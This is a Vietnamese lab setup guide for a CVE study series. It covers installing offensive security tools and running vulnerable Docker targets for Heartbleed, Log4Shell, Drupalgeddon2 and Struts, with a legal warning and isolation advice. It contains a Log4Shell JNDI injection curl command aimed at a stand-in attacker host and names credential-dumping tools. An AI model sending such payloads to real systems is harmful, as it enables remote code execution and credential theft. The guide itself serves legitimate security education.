---
title: "A0. Lab Setup Guide"
tags: [security, cve, landmark-cves, lab, setup, appendix]
aliases: [Lab Setup]
created: 2026-03-24
---

> **Prerequisites**: Linux cơ bản, quen dòng lệnh
> **Objectives**:
> - Dựng môi trường lab an toàn, cô lập với mạng thật
> - Cài đặt toàn bộ toolchain cần thiết cho series
> - Có thể reproduce từng CVE trong container/VM mà không ảnh hưởng host

---

## Nguyên tắc Lab An Toàn

Trước khi bắt đầu, cần hiểu một số nguyên tắc bắt buộc:

> [!warning] Cảnh báo pháp lý
> Tất cả kỹ thuật trong series này chỉ được thực hành trên hệ thống **bạn sở hữu** hoặc **được cấp phép**. Khai thác CVE trên hệ thống thật mà không có phép là vi phạm pháp luật tại mọi quốc gia. Toàn bộ lab sử dụng Docker container và máy ảo cô lập.

**Kiến trúc lab khuyến nghị:**

```text
Host Machine (bạn)
└── VirtualBox / VMware
    └── Kali Linux VM (attacker)
        ├── Docker: vulnerable targets
        │   ├── container: openssl-heartbleed   (Debian + OpenSSL 1.0.1f)
        │   ├── container: log4j-vulnerable     (Java 8 + Log4j 2.14.1)
        │   ├── container: drupal-7.57          (PHP + Drupal 7.57)
        │   └── container: apache-struts-2.3.5  (Tomcat + Struts 2.3.5)
        └── Tools: GDB, pwndbg, pwntools, Metasploit, Wireshark
```

Nếu không dùng VM, có thể chạy trực tiếp Docker trên Linux host — nhưng đảm bảo các container **không có kết nối ra ngoài** (`--network none` hoặc dùng Docker network cô lập).

---

## Cài đặt Attacker Machine (Kali Linux)

### Python & pwntools

```bash
sudo apt update && sudo apt install -y python3 python3-pip python3-venv

python3 -m venv ~/pwn-env
source ~/pwn-env/bin/activate

pip install pwntools scapy requests impacket
pip install cryptography paramiko
```

Kiểm tra pwntools:

```bash
python3 -c "from pwn import *; print(pwnlib.__version__)"
```

### GDB + pwndbg

```bash
sudo apt install -y gdb

git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

Sau khi cài, mở GDB sẽ tự load pwndbg. Kiểm tra:

```bash
gdb -q
# pwndbg> thấy prompt màu = thành công
```

Các lệnh hay dùng trong series:

```text
pwndbg> vmmap          # xem memory map đầy đủ
pwndbg> heap           # xem heap chunks (glibc)
pwndbg> x/20gx $rsp    # dump 20 QWORD từ stack pointer
pwndbg> telescope $rsp # smart-display stack với pointer dereference
pwndbg> checksec        # xem các mitigation của binary
```

### Wireshark & tcpdump

```bash
sudo apt install -y wireshark tshark tcpdump
sudo usermod -aG wireshark $USER
```

Capture traffic từ Docker container:

```bash
sudo tcpdump -i docker0 -w /tmp/capture.pcap
```

Dùng tshark để parse inline:

```bash
tshark -r /tmp/capture.pcap -Y "tls" -V
```

### Metasploit Framework

```bash
sudo apt install -y metasploit-framework
sudo msfdb init
msfconsole
```

Metasploit dùng trong series chủ yếu để tham khảo module logic, không phải để "click exploit." Mỗi bài sẽ viết PoC Python độc lập.

### Nmap

```bash
sudo apt install -y nmap

nmap -p 443 --script ssl-heartbleed <target>
nmap -p 445 --script smb-vuln-ms17-010 <target>
```

---

## Docker Lab Targets

### Heartbleed Target (CVE-2014-0160)

```bash
docker pull docker.io/andrewmichaelsmith/docker-heartbleed
docker run -d -p 8443:443 --name heartbleed andrewmichaelsmith/docker-heartbleed
```

Hoặc build thủ công với OpenSSL cũ:

```dockerfile
FROM debian:wheezy
RUN apt-get update && apt-get install -y openssl libssl1.0.0 nginx
COPY nginx.conf /etc/nginx/nginx.conf
EXPOSE 443
CMD ["nginx", "-g", "daemon off;"]
```

Kiểm tra:

```bash
openssl s_client -connect localhost:8443
nmap -p 8443 --script ssl-heartbleed localhost
```

### Log4Shell Target (CVE-2021-44228)

```bash
docker pull ghcr.io/christophetd/log4shell-vulnerable-app:latest
docker run -d -p 8080:8080 --name log4shell ghcr.io/christophetd/log4shell-vulnerable-app
```

Kiểm tra:

```bash
curl http://localhost:8080 -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}'
```

### Drupalgeddon2 Target (CVE-2018-7600)

```bash
docker pull drupal:7.57
docker run -d -p 8081:80 --name drupal7 drupal:7.57
```

### Apache Struts Target (CVE-2017-5638)

```bash
docker pull piesecurity/apache-struts2-cve-2017-5638
docker run -d -p 8082:8080 --name struts piesecurity/apache-struts2-cve-2017-5638
```

### Quản lý containers

```bash
docker ps -a                    # xem tất cả containers
docker start <name>             # khởi động
docker stop <name>              # dừng
docker logs <name>              # xem log
docker exec -it <name> bash     # vào shell bên trong
docker network ls               # xem networks
```

---

## Impacket — SMB/Windows Protocols

Impacket dùng để giao tiếp SMB trong lessons EternalBlue và Zerologon:

```bash
pip install impacket

python3 -c "import impacket; print(impacket.__version__)"
```

Các module impacket hay dùng:

```text
impacket-smbclient     # SMB client tương tác
impacket-rpcdump       # dump RPC endpoints
impacket-secretsdump   # dump credentials (post-Zerologon)
```

---

## Cấu trúc Workspace

Khuyến nghị tổ chức file như sau:

```text
~/cve-lab/
├── heartbleed/
│   ├── poc.py
│   └── captures/
├── eternalblue/
│   ├── poc_smb.py
│   └── shellcode/
├── log4shell/
│   ├── poc.py
│   └── ldap_server.py
├── shared/
│   ├── utils.py
│   └── payloads/
└── notes/
```

---

## Kiểm tra Môi trường

Script kiểm tra nhanh toàn bộ toolchain:

```python
import subprocess
import sys

tools = [
    ("python3", ["python3", "--version"]),
    ("gdb", ["gdb", "--version"]),
    ("nmap", ["nmap", "--version"]),
    ("docker", ["docker", "--version"]),
    ("wireshark/tshark", ["tshark", "--version"]),
]

libs = ["pwn", "scapy", "requests", "impacket"]

print("=== Tool Check ===")
for name, cmd in tools:
    try:
        out = subprocess.run(cmd, capture_output=True, text=True)
        version = out.stdout.split("\n")[0]
        print(f"[OK] {name}: {version}")
    except FileNotFoundError:
        print(f"[MISSING] {name}")

print("\n=== Python Library Check ===")
for lib in libs:
    try:
        __import__(lib)
        print(f"[OK] {lib}")
    except ImportError:
        print(f"[MISSING] {lib} — pip install {lib}")
```

Chạy:

```bash
python3 check_env.py
```

---

## References

- pwndbg docs: https://github.com/pwndbg/pwndbg
- pwntools docs: https://docs.pwntools.com
- Docker Hub vulnerable images: https://hub.docker.com
- Impacket: https://github.com/fortra/impacket
- VulnHub (offline VM targets): https://www.vulnhub.com
